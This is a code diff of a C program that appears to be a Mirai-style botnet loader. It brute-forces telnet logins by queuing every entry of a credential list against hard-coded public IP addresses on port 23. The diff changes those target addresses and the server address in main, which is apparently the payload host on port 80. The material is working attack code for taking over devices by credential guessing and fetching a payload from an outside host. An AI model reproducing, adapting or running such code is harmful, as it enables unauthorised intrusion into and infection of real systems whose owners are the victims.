@@ -83,21 +83,21 @@ void auto_scan_lab(void)
     
     srand(time(NULL));
     printf("Testing ALL %d credentials\n", cred_count);
-    printf("Target IP: 16.171.138.106\n\n");
+    printf("Target IP: 13.60.195.69\n\n");
     
     for (int c = 0; c < cred_count; c++)
     {
         char strbuf[128];
         
         // IP fixe - pas de variable inutilisée
-        snprintf(strbuf, sizeof(strbuf), "16.171.138.106:23 %s", credentials[c]);
+        snprintf(strbuf, sizeof(strbuf), "13.60.195.69:23 %s", credentials[c]);
         
         memset(&info, 0, sizeof(struct telnet_info));
         if (telnet_info_parse(strbuf, &info) != NULL)
         {
             server_queue_telnet(srv, &info);
             total++;
-            printf("[%4d] Testing 16.171.138.106 with %s\n", 
+            printf("[%4d] Testing 13.60.195.69 with %s\n", 
                    total, credentials[c]);
             usleep(10000);
         }
@@ -182,21 +182,21 @@ void auto_scan_random(void)
     
     srand(time(NULL));
     printf("Testing ALL %d credentials\n", cred_count);
-    printf("Target IP: 16.171.5.189\n\n");
+    printf("Target IP: 16.170.245.240\n\n");
     
     for (int c = 0; c < cred_count; c++)
     {
         char strbuf[128];
         
         // IP fixe - pas de variable inutilisée
-        snprintf(strbuf, sizeof(strbuf), "16.171.5.189:23 %s", credentials[c]);
+        snprintf(strbuf, sizeof(strbuf), "16.170.245.240:23 %s", credentials[c]);
         
         memset(&info, 0, sizeof(struct telnet_info));
         if (telnet_info_parse(strbuf, &info) != NULL)
         {
             server_queue_telnet(srv, &info);
             total++;
-            printf("[%4d] Testing 16.171.5.189 with %s\n", 
+            printf("[%4d] Testing 16.170.245.240 with %s\n", 
                    total, credentials[c]);
             usleep(10000);
         }
@@ -230,7 +230,7 @@ int main(int argc, char **args)
     }
 
     if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 
-                              1024 * 64, "13.60.174.173", 80, "13.60.174.173")) == NULL)
+                              1024 * 64, "16.171.26.233", 80, "16.171.26.233")) == NULL)
     {
         printf("Failed to initialize server. Aborting\n");
         return 1;
